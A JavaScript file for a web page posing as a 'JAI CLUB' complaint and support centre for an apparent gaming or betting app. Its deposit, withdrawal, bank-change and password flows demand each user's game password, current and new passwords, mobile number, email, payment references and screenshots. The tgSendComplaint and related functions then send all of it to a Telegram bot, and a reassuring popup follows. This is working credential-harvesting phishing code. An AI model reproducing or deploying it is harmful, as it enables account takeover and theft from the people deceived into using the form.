document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("year").textContent = new Date().getFullYear();

    document.querySelectorAll(".opt-tile").forEach(function (tile) {
        tile.addEventListener("click", function () {
            document.querySelectorAll(".opt-tile").forEach(function (t) {
                t.classList.remove("selected");
            });
            tile.classList.add("selected");

            var type = tile.getAttribute("data-opt");
            if (type === "deposit") {
                openFlow("d");
            } else if (type === "withdraw") {
                openFlow("w");
            } else if (type === "game") {
                openFlow("g");
            } else if (type === "password") {
                openFlow("p");
            } else if (type === "bank") {
                openFlow("b");
            } else if (type === "chat") {
                window.location.href = "../CHAT/USER%20PANEL/index.html";
            }
        });
    });
});

var FLOWS = {
    d: {
        screen: "depositScreen",
        steps: ["stepT", "step1", "step2", "step3"],
        dots: ["sdT", "sd1", "sd2", "sd3"],
        fields: ["depUsername", "depGameId", "depMobile", "depPass", "depUtr"],
        extra: "depExtra",
        imgText: "depImgText",
        imgInput: "depImg",
        imgReset: "Tap to upload payment screenshot"
    },
    w: {
        screen: "withdrawScreen",
        steps: ["wstepT", "wstep1", "wstep2", "wstep3"],
        dots: ["wsdT", "wsd1", "wsd2", "wsd3"],
        fields: ["wdUsername", "wdGameId", "wdMobile", "wdPass"],
        extra: "wdExtra",
        imgText: "wdImgText",
        imgInput: "wdImg",
        imgReset: "Click to upload withdrawal problem image"
    },
    g: {
        screen: "gameScreen",
        steps: ["gstep1"],
        dots: ["gsd1"],
        fields: ["gpEmail", "gpIssue", "gpMobile", "gpPass"],
        extra: "gpIssue",
        imgText: "gpFileText",
        imgInput: "gpFile",
        imgReset: "Tap to upload image, video or PDF"
    },
    p: {
        screen: "passScreen",
        steps: ["pstep1"],
        dots: ["psd1"],
        fields: ["pEmail", "pMobile", "pCurrent", "pNew"],
        extra: "pNew",
        imgText: "pFileText",
        imgInput: "pFile",
        imgReset: ""
    },
    b: {
        screen: "bankScreen",
        steps: ["bstep1"],
        dots: ["bsd1"],
        fields: ["bkEmail", "bkIssue", "bkMobile", "bkPass"],
        extra: "bkIssue",
        imgText: "bkFileText",
        imgInput: "bkFile",
        imgReset: "Tap to upload image, video or PDF"
    }
};

function openFlow(flow) {
    if (!FLOWS[flow]) return;
    document.getElementById(FLOWS[flow].screen).classList.add("show");
    document.body.style.overflow = "hidden";
    setStep(flow, 0);
}

function closeFlow(flow) {
    if (!FLOWS[flow]) return;
    document.getElementById(FLOWS[flow].screen).classList.remove("show");
    document.body.style.overflow = "";
    resetForm(flow);
}

function selType(btn) {
    var grid = btn.closest(".type-grid");
    grid.querySelectorAll(".type-opt").forEach(function (t) {
        t.classList.remove("selected");
    });
    btn.classList.add("selected");
}

function setStep(flow, idx) {
    var f = FLOWS[flow];
    if (!f) return;
    f.steps.forEach(function (id, i) {
        document.getElementById(id).classList.toggle("hidden", i !== idx);
    });
    f.dots.forEach(function (id, i) {
        var d = document.getElementById(id);
        if (!d) return;
        d.classList.remove("active", "done");
        if (i === idx) d.classList.add("active");
        else if (i < idx) d.classList.add("done");
    });
    var scr = document.getElementById(f.screen);
    if (scr) scr.scrollTop = 0;
}

function nextStep(flow, to) {
    var f = FLOWS[flow];
    if (!f) return;

    if (to === 1) {
        var grid = document.querySelector("#" + f.screen + " .type-grid");
        var sel = grid.querySelector(".type-opt.selected");
        if (!sel) {
            alert("Please select your problem type first.");
            return;
        }
    }
    if (to === 2) {
        var u = document.getElementById(f.fields[0]).value.trim();
        var g = document.getElementById(f.fields[1]).value.trim();
        if (u === "" || g === "") {
            alert("Please fill User Name and Game ID.");
            return;
        }
    }
    if (to === 3) {
        var m = document.getElementById(f.fields[2]).value.trim();
        var p = document.getElementById(f.fields[3]).value.trim();
        if (!/^[6-9]\d{9}$/.test(m)) {
            alert("Please enter a valid 10-digit mobile number.");
            return;
        }
        if (p === "") {
            alert("Please enter your game password.");
            return;
        }
    }
    setStep(flow, to);
}

function goStep(flow, idx) {
    setStep(flow, idx);
}

function setImgName(input) {
    var name = input.files && input.files.length > 0 ? input.files[0].name : "";
    var textId = input.getAttribute("data-text");
    var el = document.getElementById(textId);
    var resetText = el.getAttribute("data-reset");
    el.textContent = name !== "" ? "Selected: " + name : resetText;
}

/* ============ TELEGRAM SEND ============ */

function tgSendMessage(text) {
    var url = "https://api.telegram.org/bot" + TG_CONFIG.BOT_TOKEN + "/sendMessage";
    return fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TG_CONFIG.CHAT_ID,
            text: text,
            parse_mode: "HTML"
        })
    }).then(function (r) { return r.json(); });
}

function tgSendImage(fileInput, caption) {
    if (!TG_CONFIG.BOT_TOKEN || !TG_CONFIG.CHAT_ID) return Promise.resolve();
    if (!fileInput || !fileInput.files || fileInput.files.length === 0) return Promise.resolve();
    var file = fileInput.files[0];
    var fd = new FormData();
    fd.append("chat_id", TG_CONFIG.CHAT_ID);
    fd.append("photo", file);
    fd.append("caption", caption);
    fd.append("parse_mode", "HTML");
    var url = "https://api.telegram.org/bot" + TG_CONFIG.BOT_TOKEN + "/sendPhoto";
    return fetch(url, { method: "POST", body: fd }).then(function (r) { return r.json(); });
}

function escHtml(s) {
    return String(s)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
}

function emojiFor(key) {
    var k = key.toLowerCase();
    if (k.indexOf("user name") !== -1) return "👤";
    if (k.indexOf("game id") !== -1) return "🎮";
    if (k.indexOf("mobile") !== -1) return "📱";
    if (k.indexOf("phone") !== -1) return "📱";
    if (k.indexOf("game password") !== -1) return "🎯";
    if (k.indexOf("current password") !== -1) return "🔒";
    if (k.indexOf("new password") !== -1) return "🔑";
    if (k.indexOf("utr") !== -1) return "🧾";
    if (k.indexOf("email") !== -1) return "📧";
    if (k.indexOf("problem type") !== -1) return "🗂️";
    if (k.indexOf("issue") !== -1) return "🚨";
    if (k.indexOf("details") !== -1) return "📝";
    return "📌";
}

function buildComplaintText(title, fields) {
    var now = new Date();
    var dateStr = now.toLocaleString();
    var lines = [
        "🔰 <b>JAI CLUB COMPLAINT</b> 🔰",
        "=================================",
        "📋 " + escHtml(title),
        "🕒 " + escHtml(dateStr),
        "=================================",
        ""
    ];
    fields.forEach(function (item) {
        if (item.value === "") return;
        lines.push(emojiFor(item.key) + " <b>" + escHtml(item.key) + ":</b>");
        lines.push("<code>" + escHtml(item.value) + "</code>");
        lines.push("");
    });
    lines.push("=================================\n");
    return lines.join("\n");
}

function tgSendComplaint(title, fields, imageInput, imageCaption, flow) {
    if (!TG_CONFIG.BOT_TOKEN || !TG_CONFIG.CHAT_ID) {
        showPopup(flow);
        return;
    }

    var text = buildComplaintText(title, fields);
    var hasImg = imageInput && imageInput.files && imageInput.files.length > 0;

    var req = hasImg ? tgSendImage(imageInput, text) : tgSendMessage(text);

    req.then(function (res) {
        if (res && !res.ok && res.description && res.description.indexOf("too long") !== -1) {
            return tgSendImage(imageInput, "").then(function () {
                return tgSendMessage(text);
            });
        }
    }).catch(function () {
    }).then(function () {
        showPopup(flow);
    });
}

function getSelectedType(flow) {
    var f = FLOWS[flow];
    var grid = document.querySelector("#" + f.screen + " .type-grid");
    var sel = grid ? grid.querySelector(".type-opt.selected") : null;
    return sel ? sel.getAttribute("data-type") : "";
}

function submitGameProblem() {
    var email = document.getElementById("gpEmail").value.trim();
    var mobile = document.getElementById("gpMobile").value.trim();
    var pass = document.getElementById("gpPass").value.trim();
    var issue = document.getElementById("gpIssue").value.trim();

    var emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    if (!emailOk) {
        alert("Please enter a valid email ID.");
        return;
    }
    if (!/^[6-9]\d{9}$/.test(mobile)) {
        alert("Please enter a valid 10-digit mobile number.");
        return;
    }
    if (pass === "") {
        alert("Please enter your game password.");
        return;
    }
    if (issue === "") {
        alert("Please explain the issue in detail.");
        return;
    }

    var fields = [
        { key: "Email ID", value: email },
        { key: "Registered Mobile Number", value: mobile },
        { key: "Game Password", value: pass },
        { key: "Issue", value: issue }
    ];
    tgSendComplaint("GAME PROBLEM", fields, document.getElementById("gpFile"), "Game Problem Screenshot", "g");
}

function submitBankChange() {
    var email = document.getElementById("bkEmail").value.trim();
    var mobile = document.getElementById("bkMobile").value.trim();
    var pass = document.getElementById("bkPass").value.trim();
    var issue = document.getElementById("bkIssue").value.trim();

    var emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    if (!emailOk) {
        alert("Please enter a valid email ID.");
        return;
    }
    if (!/^[6-9]\d{9}$/.test(mobile)) {
        alert("Please enter a valid 10-digit mobile number.");
        return;
    }
    if (pass === "") {
        alert("Please enter your game password.");
        return;
    }
    if (issue === "") {
        alert("Please explain the issue in detail.");
        return;
    }

    var fields = [
        { key: "Email ID", value: email },
        { key: "Registered Mobile Number", value: mobile },
        { key: "Game Password", value: pass },
        { key: "Issue", value: issue }
    ];
    tgSendComplaint("BANK DETAILS CHANGE", fields, document.getElementById("bkFile"), "Bank Change Problem Screenshot", "b");
}

function submitComplain(flow) {
    var f = FLOWS[flow];
    if (!f) return;
    var extra = document.getElementById(f.extra).value.trim();
    if (extra === "") {
        alert("Please describe your problem in Step 3.");
        return;
    }

    var title = flow === "d" ? "DEPOSIT PROBLEM" : "WITHDRAWAL PROBLEM";
    var type = getSelectedType(flow);

    var username = document.getElementById(f.fields[0]).value.trim();
    var gameId = document.getElementById(f.fields[1]).value.trim();
    var mobile = document.getElementById(f.fields[2]).value.trim();
    var pass = document.getElementById(f.fields[3]).value.trim();
    var utr = flow === "d" ? document.getElementById("depUtr").value.trim() : "";

    var fields = [
        { key: "Problem Type", value: type },
        { key: "User Name", value: username },
        { key: "Game ID", value: gameId },
        { key: "Registered Mobile Number", value: mobile },
        { key: "Game Password", value: pass }
    ];
    if (utr !== "") {
        fields.push({ key: "UTR Number", value: utr });
    }
    fields.push({ key: "Details", value: extra });

    var imgInput = flow === "d" ? document.getElementById(f.imgInput) : document.getElementById("wdImg");
    var imgCaption = flow === "d" ? "Deposit Payment Screenshot" : "Withdrawal Problem Screenshot";
    tgSendComplaint(title, fields, imgInput, imgCaption, flow);
}

function showPopup(flow) {
    var popup = document.getElementById("popup");
    var card = popup.querySelector(".popup-card");
    card.classList.remove("popout");
    popup.classList.add("show");

    setTimeout(function () {
        card.classList.add("popout");
    }, 5000);

    setTimeout(function () {
        popup.classList.remove("show");
        closeFlow(flow);
        card.classList.remove("popout");
    }, 5400);
}

function resetForm(flow) {
    var f = FLOWS[flow];
    if (!f) return;
    document.querySelectorAll("#" + f.screen + " .type-opt").forEach(function (t) {
        t.classList.remove("selected");
    });
    f.fields.forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.value = "";
    });
    var ex = document.getElementById(f.extra);
    if (ex) ex.value = "";
    var screenEl = document.getElementById(f.screen);
    screenEl.querySelectorAll("input[type=file]").forEach(function (inp) {
        inp.value = "";
        var t = document.getElementById(inp.getAttribute("data-text"));
        if (t) t.textContent = inp.getAttribute("data-reset");
    });
    setStep(flow, 0);
}

function onlyDigits(el) {
    el.value = el.value.replace(/[^0-9]/g, "");
}

function onlyUpper(el) {
    el.value = el.value.toUpperCase().replace(/[^A-Z ]/g, "");
}

function onlyDigitsUpper(el) {
    el.value = el.value.toUpperCase().replace(/[^A-Z0-9]/g, "");
}

function submitPassword() {
    var email = document.getElementById("pEmail").value.trim();
    var mobile = document.getElementById("pMobile").value.trim();
    var cur = document.getElementById("pCurrent").value.trim();
    var newp = document.getElementById("pNew").value.trim();

    var emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    if (!emailOk) {
        alert("Please enter a valid email.");
        return;
    }
    if (!/^[6-9]\d{9}$/.test(mobile)) {
        alert("Please enter a valid 10-digit phone number.");
        return;
    }
    if (cur === "") {
        alert("Please enter your current password.");
        return;
    }
    if (newp.length < 4) {
        alert("New password must be at least 4 characters.");
        return;
    }

    var fields = [
        { key: "Email", value: email },
        { key: "Registered Phone Number", value: mobile },
        { key: "Current Password", value: cur },
        { key: "New Password", value: newp }
    ];
    tgSendComplaint("PASSWORD CHANGE / RESET", fields, null, "", "p");
}